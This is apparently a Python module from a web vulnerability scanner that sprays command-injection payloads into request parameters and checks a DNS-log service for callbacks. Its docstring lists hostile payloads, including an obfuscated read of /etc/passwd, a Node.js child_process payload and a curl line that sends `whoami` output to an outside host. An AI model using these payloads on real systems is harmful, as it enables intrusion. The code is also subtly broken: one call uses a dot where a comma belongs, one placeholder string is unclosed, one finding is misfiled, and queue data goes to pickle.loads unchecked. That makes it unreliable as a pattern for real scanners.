#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2019-02-20 17:02:28
# @Author  : donot (donot@donot.me)
# @Link    : https://blog.donot.me

import pickle
import pika
import sys
import os
import json
import requests
import copy
import time
from concurrent.futures import ThreadPoolExecutor
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.realpath(__file__)))))
from lib.rabbitqueue.consumerBase import ConsumerBase
from utils.globalParam import CWebScanSetting, ScanLogger,  BlackParamName, ScanTaskStatus, VulnType, AlertTemplateDict, CWebScanSetting
from utils.DataStructure import RequestData
from utils.payloads import RCEPayload_DNSLOG, RCEPayload_WEBLOG, RCEPayload_RESP
from utils.commonFunc import randomStr, randomInt
from lib.scanscript.scanBase import ScanBase

class RceScan(ScanBase):
    """docstring for RceScan"""
    def __init__(self, request, dbsession):
        super(RceScan, self).__init__(request, dbsession)

    def run(self):
        self.init()

        if self.dataformat == 'NOBODY':
            for key, value in self.getData.items():
                if key not in BlackParamName:
                    hasRceVuln = self.responsebased('params', key)
                    if hasRceVuln:
                        self.saveScanResult(VulnType['rce'], key)
                        break
                    else:
                        hasDnslogRceVuln = self.dnslogbased('params', key)
                        if hasDnslogRceVuln:
                            self.saveScanResult(VulnType['rce-dnslog']. key)
                            break
                        else:
                            continue
                else:
                    continue
        elif self.dataformat == 'FORMDATA':
            for key, value in self.postData.items():
                if key not in BlackParamName:
                    hasRceVuln = self.responsebased('data', key)
                    if hasRceVuln:
                        self.saveScanResult(VulnType['rce'], key)
                        break
                    else:
                        hasDnslogRceVuln = self.dnslogbased('data', key)
                        if hasDnslogRceVuln:
                            self.saveScanResult(VulnType['rce-dnslog'], key)
                            break
                        else:
                            continue
                else:
                    continue
        elif self.dataformat == 'JSON':
            self.jsondata = json.loads(self.postData)
            try:
                for key, value in self.jsondata.items():
                    if key not in BlackParamName:
                        hasRceVuln = self.responsebased('data', key)
                        if hasRceVuln:
                            self.saveScanResult(VulnType['rce'], key)
                        else:
                            hasDnslogRceVuln = self.dnslogbased('data', key)
                            if hasDnslogRceVuln:
                                self.saveScanResult(VulnType['rce'], key)
                                break
                            else:
                                continue
                    else:
                        continue
            except AttributeError as e:
                pass
        elif self.dataformat == 'MULTIPART':
            pass
        else:
            pass

        if self.dataformat in ['FORMDATA', 'JSON'] and self.getData != {}:
            for key, value in self.getData.items():
                if key not in BlackParamName:
                    hasRceVuln = self.responsebased('params', key)
                    if hasRceVuln:
                        self.saveScanResult(VulnType['rce'], key)
                        break
                    else:
                        hasDnslogRceVuln = self.dnslogbased('params', key)
                        if hasDnslogRceVuln:
                            self.saveScanResult(VulnType['rce-dnslog']. key)
                            break
                        else:
                            continue
                else:
                    continue

        self.changeScanStatus(ScanTaskStatus['rce_dnslog_send_finish_check_no'])

    def responsebased(self, loc, key):
        return False

    def dnslogbased(self, loc, key):
        '''
        利用dnslog检测RCE，目前主要是傻瓜怼payload模式
        + | p$IFSing -c 1 {randomStr}.dnslog.com;
        + ; p$IFSing -c 1 {randomStr}.dnslog.com;
        + `p$IFSing -c 1 {randomStr}.dnslog.com`;
        + /b?n/p?ng -c 1 blog.donot.me;
        + /'b'i'n'/'c'a't' /'e't'c'/'p'a's's'w'd;
        + /b\i\n/w\h\i\c\h n\c;
        + pi$9ng -c 1 blog.donot.me;
        + {${phpinfo()}}
        + $(curl http://paopao3.xxxx.dnslog.info/?whoami=`whoami`) - referer
        + _$$ND_FUNC$$_function(){return require('child_process').execSync('whoami',(e,out,err)=>{console.log(out);}); }()
        
        ; command
        | command
        || command
        && commands
        `command`
        $(command)
        无空格 cu$9rl${IFS}baidu.com {curl,baidu.com}
        '''
        payload_randstr =  randomStr(5, seed=int(self.saveid[6:]))
        if loc == 'params':
            for payload in RCEPayload_DNSLOG:
                _getData = copy.copy(self.getData)
                _getData[key] = str(_getData[key]) + payload.format(Separator='${IFS}',randStr=payload_randstr, DNSLogDomain=CWebScanSetting.dnslog_prefix+'.'+CWebScanSetting.log_suffix)
                res = self.reqSend(loc, _getData, self.url, self.method, self.cookie, self.ua, self.ct, self.SrcRequestHeaders)
        elif self.dataformat == 'FORMDATA':
            for payload in RCEPayload_DNSLOG:
                _postData = copy.copy(self.postData)
                _postData[key] = str(_postData[key]) + payload.format(Separator='${IFS}', randStr=payload_randstr, DNSLogDomain=CWebScanSetting.dnslog_prefix + '.' + CWebScanSetting.log_suffix)
                # print(_postData)
                res = self.reqSend(loc, _postData, self.url, self.method, self.cookie, self.ua, self.ct, self.SrcRequestHeaders)
        elif self.dataformat == 'JSON':
            for payload in RCEPayload_DNSLOG:
                _postData = copy.copy(self.jsondata)
                _postData[key] = str(_postData[key]) + payload.format(Separator='${IFS', randStr=payload_randstr, DNSLogDomain=CWebScanSetting.dnslog_prefix + '.' + CWebScanSetting.log_suffix)
                res = self.reqSend(loc, json.dumps(_postData), self.url, self.method, self.cookie, self.ua, self.ct, self.SrcRequestHeaders)
        else:
            return False
        ScanLogger.warning('All Dnslog Payload Send Finish, Payload_Str: %s' % payload_randstr)
        isVuln = self.dnslogCheck(payload_randstr)
        if isVuln:
            # self.saveScanResult(VulnType['rce-dnslog'], key)
            return True
        return False

    def weblogbased(self, loc, key):
        return False

    def dnslogCheck(self, payload_randstr):
        '''
        通过api检查是否有dnslog记录，所有的dnslog请求全部发出后再进行查询，只要查询到即认为有漏洞，未查到暂时标注为无漏洞
        '''
        try:
            s = requests.get(CWebScanSetting.dnslog_api.format(searchstr=payload_randstr))
            if s.status_code == 200:
                data = json.loads(s.text)
                if data['status'] == 1:
                    cnt = data['total']
                    if cnt > 0:
                        return True
                    elif cnt <= 0:
                        return False
                else:
                    return False
            else:
                return False
        except Exception as e:
            return False


class RceScanConsumer(ConsumerBase):
    def __init__(self, amqp_url, queue_name, routing_key, dbsession):
        super(RceScanConsumer, self).__init__(amqp_url, queue_name, routing_key)
        self.scaning = 0
        self.scaned = 0
        self.pool =  ThreadPoolExecutor(30)
        self.dbsession = dbsession

    def on_message(self, _unused_channel, basic_deliver, properties, body):
        '''
        重写消息处理方法
        '''
        data = pickle.loads(body)
        ScanLogger.warning('RceScanConsumer Received message # %s from %s: %s',
                    basic_deliver.delivery_tag, properties.app_id, data.netloc)
        self.acknowledge_message(basic_deliver.delivery_tag)
        rcescanObj = RceScan(data, self.dbsession)
        rcescanObjfeaeture = self.pool.submit(rcescanObj.run)
        self.scaning = self.scaning + 1
        ScanLogger.warning("RceScanConsumer commit scantask, taskid: %s, now total scaning task: %s" % (data.scanid, self.scaning))
        rcescanObjfeaeture.add_done_callback(self.threadcallback)
        while self.scaning > 45:
            ScanLogger.warning("RceScanConsumer ThreadPool more than 45, now: {scaningnum}".format(scaningnum=self.scaning))
            time.sleep(5)

    def threadcallback(self, obj):
        print(obj.result())
        ScanLogger.warning("RceScanConsumer task callback, now total scaning task: %s, scaned task: %s" % (self.scaning, self.scaned))
        self.scaning = self.scaning - 1
        self.scaned = self.scaned + 1



def RceScanMain():
    engine = create_engine(CWebScanSetting.MYSQL_URL, pool_size=20, pool_recycle=599, pool_timeout=30)
    DB_Session = sessionmaker(bind=engine)
    rce = RceScanConsumer(CWebScanSetting.AMQP_URL, 'rcescan', 'rcescan.key', DB_Session)
    try:
        rce.run()
    except KeyboardInterrupt:
        rce.stop()